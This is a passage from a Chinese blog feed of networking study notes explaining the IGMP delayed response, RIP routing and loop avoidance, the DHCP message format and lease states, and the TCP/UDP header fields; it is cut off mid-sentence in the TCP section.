style="color:blue;">IGMP使用延迟响应策略，避免不必要的通信量。当主机或路由器收到查询报文时，它不是立即响应，而是延迟响应</p></blockquote><p>主机或路由器使用一个随机数产生计时器，它的截止时间是1～10秒。截止时间可以使用1秒或更短的步长。</p><p>表中的每一个组都设置计时器。每个主机或路由器在发送成员关系报告报文之前都要等待它的计时器到时。在这段等待时间中，如果在同一组中的其它主机或路由器的计时器先到了截止时间，那么这个主机或路由器就发送成员关系报告报文。因为这个报文是广播发送的，等待的主机或路由器都能收到这个报文，并知道没有必要对这个组发送重复的报文;因此，等待的主机或路由器就取消发送成员关系报告。</p>]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由信息协议RIP</title>
      <link href="/2022/11/15/%E8%B7%AF%E7%94%B1%E4%BF%A1%E6%81%AF%E5%8D%8F%E8%AE%AE/"/>
      <url>/2022/11/15/%E8%B7%AF%E7%94%B1%E4%BF%A1%E6%81%AF%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="路由信息协议RIP"><a href="#路由信息协议RIP" class="headerlink" title="路由信息协议RIP"></a>路由信息协议RIP</h2><p>[TOC]</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#掌握路由协议的分类，理解静态路由和动态路由</span><span class="token comment">#掌握动态路由协议RIP的报文格式、工作原理及工作过程</span><span class="token comment">#掌握RIP计时器的作用</span><span class="token comment">#理解RIP的稳定性</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="一、路由分类："><a href="#一、路由分类：" class="headerlink" title="一、路由分类："></a>一、路由分类：</h3><h4 id="静态路由与动态路由："><a href="#静态路由与动态路由：" class="headerlink" title="静态路由与动态路由："></a>静态路由与动态路由：</h4><h5 id="路由选择"><a href="#路由选择" class="headerlink" title="路由选择:"></a>路由选择:</h5><blockquote><p>在从源点到终点的通信过程中，数据包可能经过多个路由器，直到到达连接，目的网络路由器为止。<br>当路由器收到数据包时，它应当将数据包转发到哪一个网络，取决于路由表的信息。</p></blockquote><h5 id="路由表"><a href="#路由表" class="headerlink" title="路由表:"></a>路由表:</h5><blockquote><p>静态路由表:路由信息是管理员设置的，并由管理员手动进行更新。</p></blockquote><blockquote><p>动态路由表:路由信息是随着互联网的变化而自动更新的。</p></blockquote><p>**路由选择协议:**路由选择协议是一些规则和过程的组合。规则使得路由器之间能够共享他们所知道的互联网情况和邻站信息，而过程用来合并从其它路由器收到的信息。</p><h4 id="外部和内部路由选择："><a href="#外部和内部路由选择：" class="headerlink" title="外部和内部路由选择："></a>外部和内部路由选择：</h4><p><strong>自治系统（AS,Autonomous System)</strong><br>由同一个管理机构管理、使用统一路由策略的路由器的集合。<br>最初，自治系统内部只考虑运行单个路由协议;然而，随着网络的发展，一个自治系统内现在也可以支持同时运行多种路由协议</p><img src=".\路由信息协议\自治系统.png" style="zoom:67%;" /><h5 id="两大类路由选择协议"><a href="#两大类路由选择协议" class="headerlink" title="两大类路由选择协议"></a>两大类路由选择协议</h5><p><strong>内部网关协议IGP(Interior Gateway Protocol)：</strong></p><blockquote><p style="color:blue;">内部网关协议IGP(Interior Gateway Protocol):在一个自治系统内部使用的路由选择协议</p>- 目前这类路由选择(域内路由选择)协议使用得最多，如**RIP**和**OSPF协议**。</blockquote><p><strong>外部网关协议EGP(External Gateway Protocol):</strong></p><blockquote><p style="color:blue;">外部网关协议EGP(External Gateway Protocol):在自治系统之间使用的路由选择协议</p>- 在外部网关协议中目前使用最多的是**BGP-4**协议</blockquote><h5 id="距离向量路由选择协议"><a href="#距离向量路由选择协议" class="headerlink" title="距离向量路由选择协议:"></a>距离向量路由选择协议:</h5><ol><li>从路由器到直接连接的网络的距离定义为1</li><li>从路由器到非直接连接的网络的距离定义为所经过的路由器数加1，因此也称为“跳数”</li><li>每个节点维护一个到其它节点的最小距离向量表</li><li>初始状态下，每个节点只知道到与它直接相连的节点的代价</li><li>节点周期性地向其所有相邻节点发送它的路由表信息</li><li>当一个节点从邻站收到路由表信息时，使用<strong>Bellman-Ford算法</strong>更新其路由表</li></ol><h3 id="二、RIP协议："><a href="#二、RIP协议：" class="headerlink" title="二、RIP协议："></a>二、RIP协议：</h3><h4 id="2-1：路由信息协议-Routing-Information-Protocol"><a href="#2-1：路由信息协议-Routing-Information-Protocol" class="headerlink" title="2.1：路由信息协议(Routing Information Protocol)"></a>2.1：路由信息协议(Routing Information Protocol)</h4><p>应用较早、使用较普遍的<strong>内部网关协议</strong>，适用于小型同类网络，是典型的<strong>距离向量路由协议</strong>。</p><blockquote><ul><li><p style="color:orange;">通过广播UDP协议520端口封装成的报文来交换路由信息，默认每30秒发送一次路由信息更新报文</p></li><li><p style="color:orange;">RIP使用跳数作为路由距离度量，即数据报到达目标设备所必须经过的路由器数目</p></li><li><p style="color:orange;">RIP最多支持的跳数为15，跳数16表示不可达</p></li></ul></blockquote><h5 id="RIP的工作原理"><a href="#RIP的工作原理" class="headerlink" title="RIP的工作原理"></a>RIP的工作原理</h5><ol><li>路由器启动时，路由表中只包含直通路由。运行RIP后，路由器会发送Request报文，用来请求邻居路由器的RIP路由</li><li>运行RIP的邻居路由器收到该Request报文后，会根据自己的路由表，生成Response报文进行回复</li><li>路由器在收到Response报文后，会将相应的路由添加到自己的路由表中</li><li>RIP网络稳定以后，每个路由器会<strong>周期性</strong>的向<strong>邻居路由器</strong>通稿自己的<strong>整张路由表</strong>中的路由信息，默认周期为30秒。邻居路由器根据收到的路由信息刷新自己的路由表</li><li>路由表中的每一路由项都对应了一个老化定时器，当路由项在180秒内没有任何更新时，定时器超时，该路由项的度量值变为不可达</li><li>某路由项的度量值变为不可达后，该路由会在Response报文中发布四次(120秒)，然后从路由表中清除。</li></ol><h5 id="RIP协议的特点"><a href="#RIP协议的特点" class="headerlink" title="RIP协议的特点"></a>RIP协议的特点</h5><p>仅和相邻路由器交换信息。</p><pre class="line-numbers language-none"><code class="language-none">交换的信息是当前本路由器所知道的全部信息，即自己的路由表按固定的时间间隔交换路由信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="RIPv1-vs-RIPv2"><a href="#RIPv1-vs-RIPv2" class="headerlink" title="RIPv1 vs RIPv2"></a>RIPv1 vs RIPv2</h5><p><strong>RIPv1</strong></p><blockquote><p style="color:orange;">有类别路由协议，不支持VLSM和CIDR且不支持认证。以广播的形式发送报文，目的IP地址为广播地址255.255.255.255</p></blockquote><p><strong>RIPv2</strong></p><blockquote><p style="color:orange;">无类别路由协议，支持VLSM、路由聚合与CIDR，支持明文认证和MD5密文认证，以广播或者组播(224.0.0.9)方式发送报文</p></blockquote><h4 id="2-2：RIP协议报文格式："><a href="#2-2：RIP协议报文格式：" class="headerlink" title="2.2：RIP协议报文格式："></a>2.2：RIP协议报文格式：</h4><h5 id="RIPv1的报文格式："><a href="#RIPv1的报文格式：" class="headerlink" title="RIPv1的报文格式："></a>RIPv1的报文格式：</h5><img src=".\路由信息协议\RIPv1的报文格式.png" style="zoom:67%;" /><p> 每个字段的值和作用</p><blockquote><p>Command:表示该报文是一个请求报文还是响应报文，1表示该报文是请求报文，2表示该报文是响应报文</p><p>Version:表示RIP的版本信息。对于RIPv1，该字段的值为1</p><p>Address Family ldentifier (AFI):表示地址标识信息，对于IP协议，其值为2</p><p>lP address:表示该路由条目的目的IP地址。这一项可以是网络地址、主机地址</p><p>Metric:路由条目的度量值，取值范围1-16。</p></blockquote><blockquote><p style="color:blue;">一个RIP路由更新消息中最多可包含25条路由表项，每个路由表项都携带了目的网络的地址和度量值。整个RIP报文大小限制为不超过504字节，如果整个路由表的更新消息超过该大小，需要发送多个RIPv1报文</p></blockquote><h5 id="RIPv2的报文格式："><a href="#RIPv2的报文格式：" class="headerlink" title="RIPv2的报文格式："></a>RIPv2的报文格式：</h5><img src=".\路由信息协议\RIPv2的报文格式.png" style="zoom: 50%;" /><p><strong>RIPv1与RIPv2的不同的字段</strong></p><blockquote><p>AFI:地址族标识除了表示支持的协议类型外，还可以用来描述认证信息<br>Route tag:用于标记外部路由。<br>Subnet Mask:指定IP地址的子网掩码，定义IP地址的网络或子网部分<br>Next Hop:指定通往目的地址的下—跳IP地址。</p></blockquote><h3 id="三、RIP环路："><a href="#三、RIP环路：" class="headerlink" title="三、RIP环路："></a>三、RIP环路：</h3><p>RIP网络正常运行时，RTA会通过RTB学习到10.0.0.0/8网络的路由，度量值为1。一旦路由器RTB的直连网络10.0.0.0/8产生故障，RTB会立即检测到该故障，并认为该路由不可达。此时，RTA还没有收到该路由不可达的信息，于是会继续向RTB发送通往10.0.0.0/8的路由信息。RTB会学习此路由信息，认为可以通过RTA到达10.0.0.0/8网络，度量值为2。<br>此后，RTB发送的更新路由表，又会导致RTA路由表的更新，RTA会新增一条度量值为3的10.0.0.0/8网络路由表项，从而形成路由环路。这个过程会持续下去，直到度量值为16。</p><h4 id="环路避免-水平分割"><a href="#环路避免-水平分割" class="headerlink" title="环路避免-水平分割"></a>环路避免-水平分割</h4><p>路由器从某个接口学到的路由，不会从该接口再发回给邻居路由器。</p><blockquote><p>RTA从RTB学习到的10.0.0.0/8网络的路由不会再从RTA的接收接口重新通告给RTB，由此避免了路由环路的产生。</p></blockquote><img src=".\路由信息协议\水平分割.png" style="zoom:67%;" /><h4 id="环路避免-毒性反转"><a href="#环路避免-毒性反转" class="headerlink" title="环路避免-毒性反转"></a>环路避免-毒性反转</h4><p>毒性反转机制的实现可以使错误路由立即超时。<br>毒性反转是指路由器从某个接口学到路由后，将该路由的跳数设置为16，并从原接收接口发回给邻居路由器</p><img src=".\路由信息协议\毒性反转.png" style="zoom:67%;" /><h4 id="环路避免-触发更新"><a href="#环路避免-触发更新" class="headerlink" title="环路避免-触发更新"></a>环路避免-触发更新</h4><p style="color:skyblue;">触发更新是指当路由信息发生变化时，立即向邻居设备发送触发更新报文，而不需要等待更新定时器超时，从而加速了网络收敛</p><img src=".\路由信息协议\触发更新.png" style="zoom:67%;" />]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态主机配置协议DHCP</title>
      <link href="/2022/11/14/%E5%8A%A8%E6%80%81%E4%B8%BB%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%8D%8F%E8%AE%AEDHCP/"/>
      <url>/2022/11/14/%E5%8A%A8%E6%80%81%E4%B8%BB%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%8D%8F%E8%AE%AEDHCP/</url>
      
        <content type="html"><![CDATA[<h3 id="动态主机配置协议DHCP"><a href="#动态主机配置协议DHCP" class="headerlink" title="动态主机配置协议DHCP"></a>动态主机配置协议DHCP</h3><p>[TOC]</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">#掌握DHCP的报文格式</span><span class="token comment">#掌握DHCP的工作原理</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="DHCP简介："><a href="#DHCP简介：" class="headerlink" title="DHCP简介："></a>DHCP简介：</h4><blockquote><p style="color:blue;">动态主机配置协议(Dynamic Host Configuration Protocol )是一种动态指定IP地址的机制</p></blockquote><ul><li>DHCP服务器能自动为客户端分配IP地址，减少了客户机IP地址配置的复杂度和管理开销</li><li><strong>DHCP服务器</strong>是安装了DHCP服务器软件的计算机，可在网络中设置一台或多台</li></ul><p>分配给客户的IP是临时的，DHCP客户只能在有限的时间内使用该IP，这段时间称为<strong>租用期</strong><br>租用期的数值应由DHCP服务器决定(默认1小时)，DHCP客户也可在自己发送的报文中提出对租用期的要求。<br>当租期到了的时候，服务器可以把这个IP地址分配给别的主机使用。</p><blockquote><p style="color:orange;">DHCP使用UDP协议封装，使用UDP的熟知端口67和68，68是DHCP请求报文中的源端口，67是DHCP服务器的目标端口</p></blockquote><h4 id="DHCP报文格式："><a href="#DHCP报文格式：" class="headerlink" title="DHCP报文格式："></a>DHCP报文格式：</h4><img src="D:\blog\shierjinghuang\source\_posts\动态主机配置协议DHCP\DHCP报文格式.png" style="zoom:50%;" /><blockquote><ol><li>操作码:1字节，表示是请求报文还是应答报文，1代表请求，2代表应答</li><li>硬件类型:1字节，表示正在使用的硬件技术的类型，1表示以太网。</li><li>硬件地址长度:1字节，如果是以太网，该字段值为6。</li><li>跳数:1字节，表示报文经过的DHCP中继的数目，请求报文每经过一个DHCP中继，该字段就加1。</li><li>事务ID:4字节，客户端发起一次请求时选择的随机数，服务器应答时返回客户同一个值，用来标识一次地址请求交互过程。</li><li>秒数:2字节，表示从客户端发出DHCP请求到现在所经过的秒数。</li><li>标志:2字节，第一个比特为广播响应标识位，用来标识dhcp服务器响应报文是采用单播还是广播发送。其余比特保留不用。</li><li>客户IP:4字节，如果客户已知道自己的IP，就写入，否则填入0。</li><li>你的IP:4字节，服务器分配给客户的IP。</li><li>服务器IP:4字节，由服务器填写，DHCP服务器的IP。</li><li>DHCP中继IP:4字节，客户发出请求后报文经过的第一个DHCP中继的IP。客户硬件地址:16字节，由客户端设置。</li><li>服务器主机名:64字节，由服务器填写。</li><li>引导文件名:由服务器为客户指定的配置文件名称。</li><li>选项:可选选项字段，包含报文的类型、有效租期、DNS服务器的IP地址、wins服务器的IP地址等配置信息，格式如下:</li></ol></blockquote><img src="D:\blog\shierjinghuang\source\_posts\动态主机配置协议DHCP\DHCP协议封装.png" style="zoom:67%;" /><h4 id="静态地址分配与动态地址分配："><a href="#静态地址分配与动态地址分配：" class="headerlink" title="静态地址分配与动态地址分配："></a>静态地址分配与动态地址分配：</h4><h5 id="静态地址分配"><a href="#静态地址分配" class="headerlink" title="静态地址分配"></a>静态地址分配</h5><blockquote><p style="color:blue;">将物理地址与IP地址绑定在一起，DHCP服务器将这个绑定文件存放在静态数据库中。</p><p style="color:blue;">当有主机请求分配IP时，DHCP服务器首先检查静态数据库，若静态数据库存在所请求的物理地址条目，则将相应的IP地址返回给客户。</p></blockquote><h5 id="动态地址分配"><a href="#动态地址分配" class="headerlink" title="动态地址分配"></a>动态地址分配</h5><p>DHCP服务器有一个<strong>存放IP地址的数据库</strong>(IP地址池)。当客户请求临时IP地址时，DHCP服务器就查找可用的IP地址分配给客户。</p><blockquote><p style="color:orange;">从DHCP服务器获得的IP地址是临时的，服务器预设了租用时间，租用时间到期时，客户就更新租用或停止使用这个IP地址。</p></blockquote><p>服务器对更新租用可选择同意或不同意，如果不同意，客户就停止使用这个地址。</p><h4 id="DHCP状态转换"><a href="#DHCP状态转换" class="headerlink" title="DHCP状态转换"></a>DHCP状态转换</h4><img src="D:\blog\shierjinghuang\source\_posts\动态主机配置协议DHCP\DHCP状态转换.png" style="zoom: 50%;" /><p><strong>一、初始化状态：</strong></p><ul><li>当DHCP客户端首次启动时，它处于初始化状态。客户使用向UDP端口67<strong>广播DHCPDISCOVER报文</strong>（带有DHCPDISCOVER选项的请求报文)。</li></ul><p><strong>二、选择状态：</strong></p><ul><li>发送DHCPDISCOVER报文后，客户就进入<strong>选择状态</strong>。收到请求报文的服务器用<strong>DHCPOFFER报文</strong>进行响应，提供了IP地址和租用时间，同时，服务器把提供的IP地址锁定，使这个地址不再提供给其它客户。</li><li>如果客户没有收到DHCPOFFER报文，它就再尝试4次，每次间隔2s，如果仍然没有应答，客户就睡眠300s后再试 </li></ul><p><strong>三、 请求状态 ：</strong></p><ul><li>客户选择多个DHCP服务器所提供的地址中的一个，并广播发送<strong>DHCPREQUEST报文</strong>，然后进入请求状态。</li><li>客户在请求状态等待，直到收到服务器的DHCPACK报文，然后客户进入绑定状态。 </li></ul><p><strong>四、绑定状态：</strong></p><ul><li>绑定状态下，客户在租用时间到期之前可以使用这个IP地址。当租用时间到达<strong>50%<strong>时，客户发送另一个DHCPREQUEST报文请求更新，进入</strong>更新状态</strong>。</li><li>在绑定状态，客户也可以使用<strong>DHCPRELEASE</strong>报文取消租用，进入初始化状态。</li></ul><p><strong>五、更新状态：</strong></p><ul><li><p>在更新状态下，如果客户收到更新租用的DHCPACK报文，就把计时器复位，然后回到绑定状态。</p></li><li><p>如果没有收到DHCPACK报文，且租用时间已到达87.5%，客户将再次向服务器发送DHCPREQUEST报文，进入重新绑定状态。 </p></li></ul><h4 id="DHCP运行过程"><a href="#DHCP运行过程" class="headerlink" title="DHCP运行过程"></a>DHCP运行过程</h4><p><strong>一、发现阶段：</strong></p><ul><li>DHCP客户寻找DHCP服务器的阶段。DHCP客户以广播方式发送DHCPDISCOVER报文来寻找DHCP服务器。</li></ul><img src="D:\blog\shierjinghuang\source\_posts\动态主机配置协议DHCP\DHCP发现阶段.png" style="zoom:67%;" /><p><strong>二、提供阶段：</strong></p><ul><li><p>服务器向DHCP客户提供lP地址的阶段。网络中收到<strong>DHCPDISCOVER</strong>的DHCP服务器都会做出响应，从尚未出租的IP中挑选一个分配给客户，向客户发送一个包含出租的IP地址和其它设置的<strong>DHCPOFFER</strong>报文。</p><img src="D:\blog\shierjinghuang\source\_posts\动态主机配置协议DHCP\DHCP提供阶段.png" style="zoom:67%;" /></li></ul><p><strong>三、选择阶段：</strong></p><ul><li><p>DHCP客户端选择某台DHCP服务器提供的IP地址的阶段。</p></li><li><p>如果有多台DHCP服务器向DHCP客户端发来的DHCPOFFER提供报文，则DHCP客户只接受第一个收到的DHCPOFFER提供报文，然后它就以广播方式回答一个DHCPREQUEST请求报文，该报文中包含向它所选定的DHCP服务器请求IP地址的内容。之所以要以广播方式回答，是为了通知所有的DHCP服务器，他将选择某台DHCP服务器所提供的IP地址。</p><img src="D:\blog\shierjinghuang\source\_posts\动态主机配置协议DHCP\DHCP选择阶段.png" style="zoom: 80%;" /></li></ul><p><strong>四、确认阶段：</strong></p><ul><li><p>DHCP服务器确认所提供的IP地址的阶段</p></li><li><p>当DHCP服务器收到DHCP客户回答的DHCPREQUEST请求报文之后，它便向DHCP客户发送一个包含它所提供的IP地址和其它设置的DHCPACK确认报文，告诉DHCP客户可以使用它所提供的IP地址。然后DHCP客户便将其TCP/IP协议与网卡绑定，另外，除DHCP客户选中的服务器外，其它DHCP服务器都收回曾提供的IP地址</p><img src="D:\blog\shierjinghuang\source\_posts\动态主机配置协议DHCP\DHCP确认阶段.png" style="zoom:80%;" /></li></ul><p><strong>五、重新登录：</strong></p><ul><li>以后DHCP客户每次重新登录网络时，就不需要再发送DHCPDISCOVER报文了，而是直接发送含有前一次所分配的IP地址的DHCPREQUEST请求报文。当服务器收到这一报文后，它会尝试让客户继续使用原来的IP地址，并回答一个DHCPACK确认报文。</li><li>如果此IP地址已无法再分配给原来的客户时，服务器给客户回答一个DHCPNACK否认报文。原来的客户收到否认报文后，必须重新发送DHCPDISCOVER报文来请求新的IP地址。</li></ul><p><strong>六、更新租约：</strong></p><ul><li>服务器给客户的IP地址有一个租借期限，期满后服务器会收回IP地址。如果客户要延长其IP租约，则必须更新租约。当时间到了租约期限的50%时，客户会自动向服务器发送更新其IP租约的DHCPREQUEST报文。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>传输层协议TCP与UDP</title>
      <link href="/2022/11/13/%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AEUDP%E4%B8%8ETCP/"/>
      <url>/2022/11/13/%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AEUDP%E4%B8%8ETCP/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="传输层协议TCP与UDP"><a href="#传输层协议TCP与UDP" class="headerlink" title="传输层协议TCP与UDP"></a>传输层协议TCP与UDP</h2><h3 id="进程间通信："><a href="#进程间通信：" class="headerlink" title="进程间通信："></a>进程间通信：</h3><blockquote><p style="color:orange;">点到点的通信:IP协议负责主机到主机的通信。作为网络层协议，IP协议只能把报文交付给目的主机。</p></blockquote><blockquote><p style="color:orange;">端到端的通信：运输层协议负责进程到进程的通信。TCP和UDP协议负责把报文交付到正确的进程。</p></blockquote><img src=".\传输协议UDP与TCP\进程间通信.png" style="zoom:80%;" /><h4 id="端口号"><a href="#端口号" class="headerlink" title="端口号:"></a>端口号:</h4><p>主机是用IP地址来标识的，而要标识主机中的进程，就需要使用端口号。TCP/IP协议族中，端口号占16 bit，用0~65535之间的整数标识。TCP和UDP是两个独立的软件模块，因此各自的端口号也相互独立。·端口号只具有本地意义，不同计算机的相同端口号是没有联系的。</p><h5 id="三类端口号："><a href="#三类端口号：" class="headerlink" title="三类端口号："></a>三类端口号：</h5><ul><li>熟知端口，数值为0~1023，用于标识服务器进程。</li><li>登记端口号，数值为1024~49151，为没有熟知端口号的服务器进程使用。使用这个范围的端口号必须在IANA登记，以防止重复。</li><li>客户端口号或短暂端口号，数值为49152~65535，留给客户进程选择暂时使用，一般由应用程序开发者指定或由操作系统随机分配一个未使用的端口号。当服务器进程收到客户进程的报文时，就知道了客户进程所使用的动态端口号。通信结束后，这个端口号可供其它客户进程使用。</li></ul><h5 id="UDP的熟知端口号："><a href="#UDP的熟知端口号：" class="headerlink" title="UDP的熟知端口号："></a>UDP的熟知端口号：</h5><img src=".\传输协议UDP与TCP\UDP的熟知端口号.png" style="zoom:80%;" /><h5 id="套接字："><a href="#套接字：" class="headerlink" title="套接字："></a>套接字：</h5><p>为了使多主机、多进程通信时不发生混乱，必须把主机的IP地址和端口号结合起来使用，称为<strong>套接字(Socket)</strong>.</p><blockquote><p>客户套接字地址唯一地定义了客户进程;服务器套接字地址唯一地定义了服务器进程;TCP与UDP都使用套接字通信;</p></blockquote><p>套接字包括**IP地址(32位)<strong>和</strong>端口号(16位)**，共48位.进行通信的一对套接字在整个Internet中是唯一的。</p><img src=".\传输协议UDP与TCP\套接字.png"  /><blockquote><p style="color:orange;">面向连接的服务：进行数据交换前，先建立连接，传输结柬后释放连接</p></blockquote><ol><li>建立连接阶段:在有关协议数据单元中，须给出源用户与目的用户的完整地址，同时可协商服务质量等选项。</li><li>数据交换阶段:这个阶段，每个报文中不必包含用户完整的地址，而是使用一个连接标识符来代替。报文的发送和接收都是按顺序进行的，发送方先发送的报文，在接收方先收到。</li><li>释放连接阶段:通过相应的协议数据单元完成释放操作。</li></ol><blockquote><p style="color:orange;">无连接的服务：两个实体通信前不必先建立连接。</p></blockquote><blockquote><p>无连接服务灵活方便，但不能防止报文的丢失、重复和乱序。·每个报文必须包含完整的源地址和目的地址，因此开销较大。</p></blockquote><h3 id="用户数据报协议UDP"><a href="#用户数据报协议UDP" class="headerlink" title="用户数据报协议UDP"></a>用户数据报协议UDP</h3><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">#掌握UDP协议的报文格式#掌握UDP协议校验和的计算方法#理解UDP协议的优缺点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="UDP协议简介："><a href="#UDP协议简介：" class="headerlink" title="UDP协议简介："></a>UDP协议简介：</h4><blockquote><p style="color:blue;">UDP (User Datagram Protocol，用户数据报协议）提供无连接的传输服务，对等的UDP实体在传输时不建立端到端的连接，只是简单地发送或接收数据报</p></blockquote><p>UDP协议直接位于IP协议的上层，属于运输层协议。<br>UDP协议不提供端到端的确认和重传功能，它不保证数据包一定能到达目的地，因此是不可靠协议，使用UDP的程序可根据自己的需求设计相应的可靠性机制，如TFTP。</p><h5 id="UDP协议的特点"><a href="#UDP协议的特点" class="headerlink" title="UDP协议的特点"></a>UDP协议的特点</h5><p>发送数据之前不需要建立连接，UDP主机不需要维持复杂的连接状态表。</p><p>UDP用户数据报只有8个字节的首部开销。<br>网络的拥塞不会使源主机的发送速率降低，这对某些实时应用是很重要的。·当数据包在传送过程中发生错误时UDP不能报告错误。<br>UDP保留应用程序定义的报文边界，当应用程序把一块数据交给UDP发送时，这块数据将作为独立的单元到达对方的应用程序，因此，应用程序必须关心IP数据报的长度。</p><h4 id="UDP报文格式："><a href="#UDP报文格式：" class="headerlink" title="UDP报文格式："></a>UDP报文格式：</h4><img src=".\传输协议UDP与TCP\UDP报文格式.png" style="zoom: 67%;" /><p>首部字段和数据字段。首部字段8个字节，由4个字段组成，每个字段2字节</p><ol><li>源端口:表示发送端的端口号。不同的应用程序使用不同的端口号，实现了同一时间段内多个应用程序可以一起使用网络进行数据的发送和接收。</li><li>目的端口:表示数据包被发往的目的端的端口号。</li><li>有效负载长度:包括UDP首部和UDP数据在内的整个用户数据报的长度。该字段的最小值是8，一些UDP实现将数据报的大小限制到了8192字节。</li><li>校验和:UDP的校验的校验范围包括伪首部（IP首部的部分字段)、UDP首部和UDP数据，该字段是可选的。如果该字段值为零就说明不进行校验。</li></ol><p>UDP用户数据报封装在IP数据报中，IP数据报的“协议类型”字段的值是17，表示数据部分是从UDP协议来的。</p><img src=".\传输协议UDP与TCP\UDP封装.png" style="zoom:67%;" /><h5 id="UDP校验和的计算"><a href="#UDP校验和的计算" class="headerlink" title="UDP校验和的计算"></a>UDP校验和的计算</h5><blockquote><p style="color:blue;">UDP校验和的计算与IP和ICMP校验和的计算不同。UDP校拉和T拉H围包括三部分:伪首部、UDP首部以及从应用层来的数据。</p></blockquote><p>伪首部是IP首部的一部分，其中有些字段要填入0。若校演和不包括伪首部，用户数据报也可能是安全的和正确的。但是，若lP首部受到损伤，则它可能被交付到错误的主机。</p><p>伪首部中的高层协议类型是为了确保这个数据报是属于UDP而不是是属丁于TCP。UDP的高层协议类型是17，若这个值在传输过程中出错，接收端就能检出并丢弃这个数据包，从而不会交付给错误的协议。</p><h4 id="UDP的应用："><a href="#UDP的应用：" class="headerlink" title="UDP的应用："></a>UDP的应用：</h4><p>UDP适用于这样的进程，它需要简单的请求—响应通信，而较少考虑流量控制和差错控制。对于需要传送成块数据的进程，如FTP，则通常不使用UDP。<br>UDP适用于具有内部流量控制和差错控制机制的进程。对多播和广播来说，UDP是个比较合适的传输层协议。UDP可用于管理进程，如SNMP协议。<br>UDP可用于某些路由选择更新协议，如RIP协议。</p><h3 id="传输控制协议TCP"><a href="#传输控制协议TCP" class="headerlink" title="传输控制协议TCP"></a>传输控制协议TCP</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 掌握TCP协议的报文格式</span><span class="token comment"># 掌握TCP连接的建立和释放过程</span><span class="token comment"># 掌握TCP数据传输中编号与确认的过程掌握TCP协议校验和的计算方法</span><span class="token comment"># 理解TCP重传机制</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="TCP协议简介："><a href="#TCP协议简介：" class="headerlink" title="TCP协议简介："></a>TCP协议简介：</h4><p>TCP协议是TCP/IP协议族中的面向连接的、可靠的、端到端的运输层协议。</p><p>TCP提供全双工服务，全双工连接包括两个独立的、方向相反的数据流。与UDP不同，TCP允许发送和接收字节流形式的数据。为了使服务器和客户端以不同的速度双向发送和接收数据，TCP提供了发送和接收两个缓冲区。TCP在报文中加上一个递增的确认序列号来告诉发送端，接收端期望收到的下一个报文，如果在规定时间内，没有收到关于这个包的确认响应，则重新发送此包，这保证了TCP是一种可靠的传输层协议。</p><img src=".\传输协议UDP与TCP\TCP的熟知端口号.png" style="zoom:50%;" /><h4 id="TCP报文格式："><a href="#TCP报文格式：" class="headerlink" title="TCP报文格式："></a>TCP报文格式：</h4><img src=".\传输协议UDP与TCP\TCP报文格式.png" style="zoom: 50%;" /><p>源端口:2字节，主机中发送这个报文的应用程序端口号。</p><p>目的端口:2字节，目的主机中接收这个报文的应用程序的端口号。</p><p>序列号:4字节，定义了指派给本报文第一个数据字节的一个序号。TCP是流式传输协议，为了保证连通性，要在发送的每一个字节上编号。序号指定了这个序列中的哪一个字节是报文的第一个字节。在连接建立时，双方使用随机数产生器产生初始序号，通常每一方的初始序号都是不同的。</p><p>确认号:4字节，接收端期望收到的下一个报文段中数据部分的第一个字节的序号。</p><p>首部长度:4位，指定TCP首部的长度，以4字节为单位。首部长度可以在20~60字节之间。因此，这个字段的值可以在5至15之间。<br>保留字段:4位，保留为今后使用，目前应置为0。<br>控制字段:定义了8种不同的标志。用在TCP的流量控制、连接建立和终止以及数据传送的方式等方面。在同一时间可设置一位或多位标志。</p><img src=".\传输协议UDP与TCP\TCP的控制字段.png" style="zoom:67%;" /><img src="./网际协议IP/\TCP控制字段具体信息.png" style="zoom: 50%;" /><p>窗口:2字节，窗口字段用来控制对方发送的数据量，单位为字节。TCP连接的一端根据设置的缓存空间大小确定自己的接收窗口大小，然后通知对方以确定对方的发送窗口的上限。这时，发送端必须服从接收端的决定。</p><p>检验和:2字节，检验的范围包括首部和数据这两部分。在计算检验和时，要在TCP报文段的前面加上12字节的伪首部。</p><p>紧急指针:2字节，只有当URG=1时才有效，指出在本报文段中的紧急数据的最后一个字节的序号，使接收方知道紧急数据共有多少字节(紧急数据结束后是普通数据)。发送方TCP即使发送窗口为0，也要对带有URG标志的数据段实行强制发送。</p><p>选项:长度可变，最多40字节。</p><p>最大报文段长度MSS (Maximum Segment Size)。</p><blockquote><ul><li> TCP报文段中的数据字段的最大长度。</li><li>与接收窗口值没有关系，不是考虑接收方的缓存是否可以放下TCP报文段中的数据。</li><li>目的是提高网络的利用率，使TCP报文段携带的数据尽可能多，以提高分组中数据部分所占的比例。</li><li>MSS应该尽可能大，只要在IP层不需要进行分片即可。但由于传输路径的动态性，很难确定最佳MSS。</li><li>连接建立时，双方把自己能够支持的MSS通知对方，默认值是536 Byte。因此所有主机都能接受的报文段长度是556 